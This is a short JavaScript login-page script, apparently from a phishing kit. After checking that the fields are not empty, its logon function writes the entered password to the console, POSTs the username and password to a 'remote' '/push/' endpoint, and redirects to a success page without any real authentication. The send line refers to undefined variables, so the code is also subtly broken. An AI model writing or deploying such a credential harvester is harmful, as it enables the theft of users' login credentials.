window.onload = function()
{
    var height=window.screen.height;
    y=height+"px";
    var a=document.getElementById("img").style.height=y;
    console.log(height)
    return true
}
function logon(){
    console.log("uses use the logon button")
    var ps = document.getElementById("ps").value;
    var users=document.getElementById("users").value;
    if
    (
        users == ""
    )
    {
        alert("用户名不可为空")
        console.log("the input usersname is space")
        return false
    }
    if 
    (
        ps == ""
    )
    {
        alert("密码不可为空")
        console.log("the input password is space")
        return false
    }
    else
    {
        console.log(users)
        console.log(ps)
        var url = window.location.href;
        var xhr = new XMLHttpRequest();
        xhr.open('POST', remote+"/push/"+url.substring(remote.length).replace("/","")+"/", true);
        xhr.send(JSON.stringify({"content":"用户名: "+username+" 密码: "+password}));
    
        xhr.onload = function() {
            window.location.href = "/resource/other/ok.html"
        };
    }
}